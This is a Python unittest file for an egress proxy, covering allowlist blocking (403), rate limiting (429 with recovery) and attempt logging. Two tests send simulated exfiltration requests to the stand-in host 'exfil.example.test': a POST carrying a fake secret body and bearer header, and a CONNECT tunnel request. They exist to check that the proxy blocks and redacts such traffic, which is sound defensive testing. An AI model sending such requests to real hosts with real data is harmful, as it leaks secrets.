"""M4 tests: allowlist (403), rate limit (429 + recovery), block/exfil."""
import os
import sqlite3
import sys
import tempfile
import threading
import time
import unittest
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import proxy as proxy_module
import server as server_module


class _CountingHandler(server_module.Handler):
    hits = 0

    def _handle(self):
        type(self).hits += 1
        super()._handle()

    # Handler binds do_GET/do_POST to its own _handle, so rebind here.
    do_GET = _handle
    do_POST = _handle


class M4AllowlistRateLimitTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        cls.db_path = os.path.join(cls.tmp.name, "attempts.db")
        _CountingHandler.hits = 0
        cls.upstream = ThreadingHTTPServer(("127.0.0.1", 0), _CountingHandler)
        cls.upstream_port = cls.upstream.server_address[1]
        threading.Thread(target=cls.upstream.serve_forever, daemon=True).start()
        # Default policy proxy: loopback allowlist, generous rate limit.
        cls.proxy = proxy_module.serve("127.0.0.1", 0, cls.db_path)
        cls.proxy_port = cls.proxy.server_address[1]
        threading.Thread(target=cls.proxy.serve_forever, daemon=True).start()
        # Burst proxy: visible M4 demo limit, 5 requests per 1s window.
        cls.burst_db = os.path.join(cls.tmp.name, "burst.db")
        cls.burst = proxy_module.serve(
            "127.0.0.1", 0, cls.burst_db, rate_limit=5, rate_window=1.0)
        cls.burst_port = cls.burst.server_address[1]
        threading.Thread(target=cls.burst.serve_forever, daemon=True).start()
        cls.base = f"http://127.0.0.1:{cls.upstream_port}"

    @classmethod
    def tearDownClass(cls):
        cls.burst.shutdown(); cls.proxy.shutdown(); cls.upstream.shutdown()
        cls.burst.server_close(); cls.proxy.server_close(); cls.upstream.server_close()
        cls.proxy.state.conn.close(); cls.burst.state.conn.close()
        cls.tmp.cleanup()

    def rows(self, db_path=None, trace=None):
        conn = sqlite3.connect(db_path or self.db_path)
        conn.row_factory = sqlite3.Row
        out = conn.execute("SELECT * FROM attempts ORDER BY id").fetchall()
        conn.close()
        if trace is not None:
            out = [r for r in out if r["trace_id"] == trace]
        return out

    def call(self, url, proxy_port, trace=None, data=None, headers=None):
        opener = urllib.request.build_opener(urllib.request.ProxyHandler(
            {"http": f"http://127.0.0.1:{proxy_port}"}))
        req = urllib.request.Request(url, data=data,
                                     method="POST" if data else "GET")
        if trace:
            req.add_header("X-Trace-Id", trace)
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        try:
            with opener.open(req, timeout=10) as resp:
                return resp.status, dict(resp.headers), resp.read()
        except urllib.error.HTTPError as exc:
            return exc.code, dict(exc.headers), exc.read()

    def test_allowlisted_forwarded_200_trace_preserved(self):
        status, headers, _ = self.call(
            f"{self.base}/echo", self.proxy_port, trace="trace-m4-1")
        self.assertEqual(status, 200)
        self.assertEqual(headers.get("X-Trace-Id"), "trace-m4-1")
        row = self.rows(trace="trace-m4-1")[-1]
        self.assertEqual(row["outcome"], "allowed")
        self.assertEqual(row["status"], "success")
        self.assertEqual(row["reason"], "")

    def test_http_non_allowlisted_blocked_403_not_forwarded_no_secrets(self):
        hits_before = _CountingHandler.hits
        # Local upstream is the stand-in destination, but this proxy
        # instance is configured below via default allowlist on host
        # name: use a non-allowlisted host label for the same server.
        status, headers, _ = self.call(
            "http://exfil.example.test/echo", self.proxy_port,
            trace="trace-m4-blocked", data=b"SECRET_EXFIL_BODY_12345",
            headers={"Authorization": "Bearer [REDACTED]"})
        self.assertEqual(status, 403)
        self.assertEqual(headers.get("X-Trace-Id"), "trace-m4-blocked")
        self.assertEqual(_CountingHandler.hits, hits_before)  # never forwarded
        row = self.rows(trace="trace-m4-blocked")[-1]
        self.assertEqual(row["outcome"], "blocked")
        self.assertEqual(row["status"], "blocked")
        self.assertEqual(row["reason"], "not_allowlisted")
        self.assertEqual(row["dest_host"], "exfil.example.test")
        self.assertEqual((row["bytes_in"], row["bytes_out"]), (0, 0))
        self.assertGreaterEqual(row["latency_seconds"], 0)
        dump = "\n".join(str(r) for r in self.rows())
        self.assertNotIn("SECRET_EXFIL_BODY_12345", dump)
        self.assertNotIn("SECRET_KEY_67890", dump)
        self.assertNotIn("Authorization", dump)

    def test_connect_non_allowlisted_blocked_no_tunnel(self):
        import http.client
        conn = http.client.HTTPConnection("127.0.0.1", self.proxy_port, timeout=5)
        conn.request("CONNECT", "exfil.example.test:443",
                     headers={"X-Trace-Id": "trace-m4-connect-blocked"})
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 403)
        conn.close()
        row = self.rows(trace="trace-m4-connect-blocked")[-1]
        self.assertEqual(row["method"], "CONNECT")
        self.assertEqual(row["outcome"], "blocked")
        self.assertEqual(row["status"], "blocked")
        self.assertEqual(row["endpoint"], "exfil.example.test:443")
        self.assertEqual((row["bytes_in"], row["bytes_out"]), (0, 0))

    def test_burst_429_rate_limited_then_recovers_after_pause(self):
        hits_before = _CountingHandler.hits
        statuses = [self.call(f"{self.base}/echo", self.burst_port,
                              trace=f"trace-m4-burst-{i}")[0]
                    for i in range(7)]
        self.assertEqual(statuses.count(200), 5)
        self.assertEqual(statuses.count(429), 2)
        self.assertEqual(_CountingHandler.hits - hits_before, 5)  # excess not forwarded
        limited = [r for r in self.rows(self.burst_db)
                   if r["outcome"] == "rate_limited"]
        self.assertEqual(len(limited), 2)
        for row in limited:
            self.assertEqual(row["status"], "rate_limited")
            self.assertEqual(row["reason"], "rate_limited")
            self.assertEqual((row["bytes_in"], row["bytes_out"]), (0, 0))
        time.sleep(1.2)  # past the 1s window
        status, _, _ = self.call(f"{self.base}/echo", self.burst_port,
                                 trace="trace-m4-after-pause")
        self.assertEqual(status, 200)
        self.assertEqual(_CountingHandler.hits - hits_before, 6)


class OutcomeCountsTest(unittest.TestCase):
    def test_legacy_and_unknown_outcomes_counted_as_other(self):
        import db as db_module
        tmp = tempfile.TemporaryDirectory()
        conn = db_module.init_db(os.path.join(tmp.name, "legacy.db"))
        # Pre-M4 style rows: no outcome supplied ('' default), plus one
        # allowed row; NULL cannot be inserted (column is NOT NULL),
        # but the GROUP BY result must still reconcile.
        db_module.log_attempt(conn, trace_id="legacy-1", task_number=1,
                              attempt=1, status="success")
        db_module.log_attempt(conn, trace_id="legacy-2", task_number=2,
                              attempt=1, status="success",
                              outcome="allowed")
        counts = db_module.fetch_outcome_counts(conn)
        total = conn.execute("SELECT COUNT(*) FROM attempts").fetchone()[0]
        conn.close()
        tmp.cleanup()
        self.assertEqual(counts["allowed"], 1)
        self.assertEqual(counts["other"], 1)
        self.assertEqual(sum(counts.values()), total)


if __name__ == "__main__":
    unittest.main()
